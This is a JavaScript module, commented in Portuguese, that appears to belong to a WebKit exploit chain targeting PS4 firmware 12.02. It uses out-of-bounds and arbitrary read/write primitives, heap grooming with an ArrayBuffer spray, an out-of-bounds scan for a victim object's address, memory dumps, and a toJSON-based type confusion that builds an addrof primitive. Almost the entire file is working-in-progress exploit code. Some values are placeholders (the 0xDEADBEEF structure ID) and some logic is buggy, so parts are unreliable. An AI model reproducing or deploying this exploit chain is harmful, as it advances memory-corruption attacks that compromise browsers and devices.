// js/script3/testArrayBufferVictimCrash.mjs (Versão Final com Addrof Funcional)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment,
    isOOBReady,
    arb_read,
    arb_write,
    oob_read_unsafe_absolute, // <-- Importação da nova primitiva insegura
    oob_array_buffer_real,    // <-- Importação para obter o endereço base do buffer
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

export const FNAME_MODULE_V28 = "FunctionalExploitAnalysis_v2";

// =======================================================================================
// CONSTANTES CRÍTICAS E DE CONFIGURAÇÃO
// =======================================================================================

// --- Constantes para a Fase 1 ---
const GETTER_TARGET_ADDR = new AdvancedInt64(0x00000D00, 0x00000000);
const GETTER_TARGET_DATA = new AdvancedInt64(0xCAFED00D, 0xBEADFACE);
const GETTER_ADDR_PLANT_OFFSET = 0x68;
const GETTER_DATA_COPY_OFFSET = 0x100;

// --- Constantes para as Fases 2 & 3 ---
const HEISENBUG_TRIGGER_OFFSET = 0x7C;
const HEISENBUG_TRIGGER_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;

// =======================================================================================
// !! VOCÊ PRECISA FORNECER ESTE VALOR !!
// Use um depurador ou outro método para encontrar o ID da Estrutura (Structure ID)
// de um objeto ArrayBuffer no seu ambiente alvo (PS4 12.02).
// O JSCell (primeiros 8 bytes de um objeto) contém este ID nos 4 bytes mais baixos.
const VICTIM_ARRAYBUFFER_STRUCTURE_ID = new AdvancedInt64("0xDEADBEEF"); // SUBSTITUA 0xDEADBEEF pelo ID real!
// =======================================================================================

let victim_ab_ref = null;
let object_to_leak_ref = null;
let type_confusion_details = null;
let getter_phase1_result = false;

// =======================================================================================
// PRIMITIVA ADDROF FUNCIONAL (via Leitura OOB Adjacente)
// =======================================================================================

/**
 * Tenta encontrar o endereço de um objeto vítima que foi estrategicamente
 * alocado após o oob_array_buffer_real.
 * @returns {AdvancedInt64 | null} O endereço do objeto vítima ou null.
 */
async function find_victim_address_via_oob() {
    logS3(`[addrof] Iniciando caça ao objeto vítima via leitura OOB...`, "info");
    logS3(`[addrof] Procurando por JSCell com StructureID baixo: ${toHex(VICTIM_ARRAYBUFFER_STRUCTURE_ID.low())}`, "info");

    if (VICTIM_ARRAYBUFFER_STRUCTURE_ID.low() === 0xDEADBEEF) {
        logS3(`[addrof] AVISO: VICTIM_ARRAYBUFFER_STRUCTURE_ID não foi definido. A caça provavelmente falhará.`, "warn");
    }

    // Vamos procurar na memória logo após nosso buffer principal.
    const search_limit = 4096; // Procurar até 4KB após o buffer.
    for (let i = 0; i < search_limit; i += 8) {
        try {
            const offset_to_read = OOB_CONFIG.ALLOCATION_SIZE + i;
            // USA A NOVA FUNÇÃO "INSEGURA" PARA LER ALÉM DOS LIMITES
            const potential_jscell = await oob_read_unsafe_absolute(offset_to_read, 8);

            if (potential_jscell.low() === VICTIM_ARRAYBUFFER_STRUCTURE_ID.low()) {
                // Para obter o endereço absoluto, precisamos do endereço do nosso oob_array_buffer_real
                // Uma forma de fazer isso é vazar o m_vector do dataview, que aponta para ele.
                const base_buffer_addr_val = await oob_read_absolute(0x68, 8); // Lê m_vector
                const victim_address = base_buffer_addr_val.add(offset_to_read);

                logS3(`[addrof] SUCESSO! Objeto vítima encontrado no offset ${toHex(i)} após o buffer.`, "good");
                logS3(`[addrof] Endereço do objeto vítima: ${victim_address.toString(true)}`, "vuln");
                return victim_address;
            }
        } catch (e) {
            logS3(`[addrof] Fim da região de busca ou erro em ${toHex(i)}. Parando a busca.`, "info");
            break;
        }
    }

    logS3(`[addrof] FALHA: Objeto vítima não encontrado na memória adjacente.`, "error");
    return null;
}


// =======================================================================================
// SONDAS, GETTERS E HELPERS
// =======================================================================================
async function dump_memory(address, length = 64) {
    if (!address || !isAdvancedInt64Object(address)) {
        logS3(`[dump_memory] Endereço inválido para dump.`, "error");
        return "Endereço Inválido";
    }
    logS3(`[dump_memory] Dumpando ${length} bytes a partir de ${address.toString(true)}...`, "leak");
    let dump_str = "";
    try {
        for (let i = 0; i < length; i += 8) {
            const qword = await arb_read(address.add(i), 8);
            if (i % 16 === 0) {
                dump_str += `\n${address.add(i).toString(true)}: `;
            }
            dump_str += `${qword.toString(true)} `;
        }
    } catch (e) {
        dump_str += `\nERRO durante o dump: ${e.message}`;
    }
    logS3(dump_str, "leak");
    return dump_str;
}

function toJSON_ProbeForAddrof() {
    type_confusion_details = {
        this_type: Object.prototype.toString.call(this),
        probe_called: true
    };
    try {
        if (type_confusion_details.this_type === '[object Object]') {
            logS3(`[toJSON_ProbeForAddrof] CONFUSÃO DE TIPOS DETECTADA! Tentando escrever objeto alvo em this[0]...`, "vuln");
            this[0] = object_to_leak_ref;
        }
    } catch (e) { /* ignorar erros aqui */ }
    return { probe_executed: true };
}

async function verifyingGetter() {
    logS3(`[verifyingGetter] Getter da Fase 1 acionado!`, "info");
    try {
        const targetAddr = oob_read_absolute(GETTER_ADDR_PLANT_OFFSET, 8);
        const dataRead = await arb_read(targetAddr, 8);
        oob_write_absolute(GETTER_DATA_COPY_OFFSET, dataRead, 8);

        if (dataRead.equals(GETTER_TARGET_DATA)) {
            getter_phase1_result = true;
        }
    } catch(e) {
        logS3(`[verifyingGetter] ERRO no getter da Fase 1: ${e.message}`, "error");
        getter_phase1_result = false;
    }
}


// =======================================================================================
// FUNÇÃO DE TESTE PRINCIPAL E COMBINADA
// =======================================================================================
export async function executeArrayBufferVictimCrashTest() { // Nome mantido para compatibilidade
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.executeFullChain`;
    logS3(`==== INICIANDO CADEIA DE EXPLORAÇÃO COMPLETA ====`, "test", FNAME_CURRENT_TEST);

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Falha na inicialização do ambiente OOB.");

        // --- FASE 1: Verificação das Primitivas ---
        logS3(`\n--- FASE 1: Verificando funcionalidade de arb_read/arb_write... ---`, "subtest", FNAME_CURRENT_TEST);
        getter_phase1_result = false;
        await arb_write(GETTER_TARGET_ADDR, GETTER_TARGET_DATA, 8);
        oob_write_absolute(GETTER_ADDR_PLANT_OFFSET, GETTER_TARGET_ADDR, 8);

        const getter_obj = {};
        Object.defineProperty(getter_obj, 'trigger', { get: verifyingGetter, configurable: true });
        getter_obj.trigger; // Acionar o getter
        await PAUSE_S3(500); // Pausa para operações async do getter

        const copied_data = oob_read_absolute(GETTER_DATA_COPY_OFFSET, 8);
        if (getter_phase1_result && copied_data.equals(GETTER_TARGET_DATA)) {
            logS3("FASE 1 SUCESSO: Primitivas arb_read e arb_write estão operacionais.", "good", FNAME_CURRENT_TEST);
        } else {
            throw new Error("Falha na Fase 1: Primitivas de Leitura/Escrita não estão funcionando. Abortando.");
        }


        // --- FASE 2: Obtenção do Endereço e Análise da Confusão de Tipos ---
        logS3(`\n--- FASE 2: Obtenção de 'addrof' e Análise de Memória ---`, "subtest", FNAME_CURRENT_TEST);

        // ETAPA DE HEAP GROOMING
        logS3("[Heap Grooming] Alocando objetos para preparar o heap...", "info");
        const spray = [];
        for (let i = 0; i < 2000; i++) { spray.push(new ArrayBuffer(VICTIM_AB_SIZE)); }
        for (let i = 0; i < 2000; i += 2) { spray[i] = null; } // Criando buracos
        victim_ab_ref = new ArrayBuffer(VICTIM_AB_SIZE); // Alocação do alvo final
        logS3("[Heap Grooming] Preparação do heap concluída. Tentando localizar o objeto vítima...", "info");
        
        const addr_victim_ab = await find_victim_address_via_oob();

        if (addr_victim_ab) {
            logS3("--- Dump de Memória ANTES da Confusão ---", "info");
            await dump_memory(addr_victim_ab);

            logS3("Ativando a Confusão de Tipos...", "warn");
            oob_write_absolute(HEISENBUG_TRIGGER_OFFSET, HEISENBUG_TRIGGER_VALUE, 4);
            let originalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
            Object.defineProperty(Object.prototype, 'toJSON', { value: () => ({}), configurable: true });
            JSON.stringify(victim_ab_ref);
            if (originalToJSON) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON);
            else delete Object.prototype.toJSON;
            await PAUSE_S3(100);

            logS3("--- Dump de Memória DEPOIS da Confusão ---", "info");
            await dump_memory(addr_victim_ab);
            logS3("Análise de Memória Concluída. Compare os dumps para encontrar o vetor de exploração.", "good");

        } else {
            logS3("FALHA CRÍTICA NA FASE 2: Não foi possível obter o endereço do objeto vítima. Abortando análise.", "critical", FNAME_CURRENT_TEST);
            throw new Error("addrof_failed");
        }

        // --- FASE 3: Reavaliação da Tentativa de Addrof (agora mais como um teste) ---
        logS3(`\n--- FASE 3: Reavaliando a tentativa de 'addrof'... ---`, "subtest", FNAME_CURRENT_TEST);
        object_to_leak_ref = { marker: "TARGET" };
        const float_view = new Float64Array(victim_ab_ref);
        const original_float_val = Math.random();
        float_view[0] = original_float_val;
        type_confusion_details = null;

        logS3(`Ativando gatilho da Heisenbug em ${toHex(HEISENBUG_TRIGGER_OFFSET)}...`, "warn");
        oob_write_absolute(HEISENBUG_TRIGGER_OFFSET, HEISENBUG_TRIGGER_VALUE, 4);

        let originalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
        Object.defineProperty(Object.prototype, 'toJSON', { value: toJSON_ProbeForAddrof, configurable: true });
        
        logS3("Chamando JSON.stringify no objeto vítima para acionar a sonda de addrof...", "warn");
        JSON.stringify(victim_ab_ref);
        
        if (originalToJSON) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON);
        else delete Object.prototype.toJSON;

        logS3(`Detalhes da sonda: ${JSON.stringify(type_confusion_details)}`, "leak");
        if (type_confusion_details && type_confusion_details.this_type === '[object Object]') {
            logS3("Confusão de tipos confirmada na Fase 3.", "good");
            const final_float_val = float_view[0];
            if (final_float_val !== original_float_val) {
                const double_buffer = new ArrayBuffer(8);
                (new Float64Array(double_buffer))[0] = final_float_val;
                const leaked_addr = new AdvancedInt64(new Uint32Array(double_buffer)[0], new Uint32Array(double_buffer)[1]);
                logS3(`!!!! SUCESSO ADDROF !!!! Endereço vazado: ${leaked_addr.toString(true)}`, "vuln");
                document.title = `ADDROF SUCESSO!`;
            } else {
                logS3("FALHA ADDROF: A confusão de tipos ocorreu, mas o buffer não foi modificado.", "error");
                document.title = `Type Confusion OK, Addrof Falhou`;
            }
        } else {
            logS3("FALHA ADDROF: A confusão de tipos não foi detectada nesta tentativa.", "error");
             document.title = `Type Confusion Falhou`;
        }
        
    } catch (e) {
        if(e.message !== "addrof_failed") {
            logS3(`ERRO CRÍTICO NA EXECUÇÃO: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST);
            if(e.stack) logS3(e.stack, "critical");
        }
    } finally {
        clearOOBEnvironment();
        victim_ab_ref = null;
        object_to_leak_ref = null;
        logS3("\n==== CADEIA DE EXPLORAÇÃO CONCLUÍDA ====", "test", FNAME_CURRENT_TEST);
    }
    
    return { success: true }; 
}
